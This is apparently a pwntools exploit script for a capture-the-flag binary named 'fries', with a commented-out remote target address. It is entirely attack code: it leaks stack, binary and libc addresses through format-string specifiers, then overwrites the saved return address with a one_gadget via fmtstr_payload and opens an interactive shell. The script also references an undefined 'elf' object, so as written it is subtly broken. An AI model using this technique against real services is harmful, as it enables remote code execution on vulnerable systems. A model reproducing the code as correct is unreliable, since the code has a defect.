from pwn import *

p = process('./fries')
#p = remote('43.249.195.138',21702)
libc = ELF('libc.so.6')
def debug():
    gdb.attach(p)
    pause()


p.recvuntil('Emmmmm... Could you give me some fries\n')
p.sendline('fries\x00')
p.recvuntil('Go get some fries on the pier\n')
p.sendline(b'%10$p%24$p')
x= int(p.recv(14),16)
elf_base = x-16416
elf.address = elf_base
stack= int(p.recv(14),16)
ret = stack - 72


pay = b'%9$s'
pay += (8 - (len(pay) % 8)) * b'A'
pay += p64(elf.got['puts'])
p.recvuntil('Go get some fries on the pier\n')

p.sendline(pay)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success('puts: %s',puts_addr)
libc_base = puts_addr - libc.sym['puts']
ogg = [0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]

og = libc_base + ogg[0]
o1 = og &0xFFFFFFFF
o2 = (og >> 32)&0xFFFFFFFF


success('libc_base: %s',libc_base)
pay = fmtstr_payload(8,{ret:o1},write_size='short')
p.recvuntil('Go get some fries on the pier\n')

p.sendline(pay)
pay = fmtstr_payload(8,{ret+4:o2},write_size='short')
p.recvuntil('Go get some fries on the pier\n')

p.sendline(pay)
p.recvuntil('Go get some fries on the pier\n')
p.sendline('\x00\x00\x00\x00')
for i in range(4):
    p.sendline('ls\x00')
p.interactive()
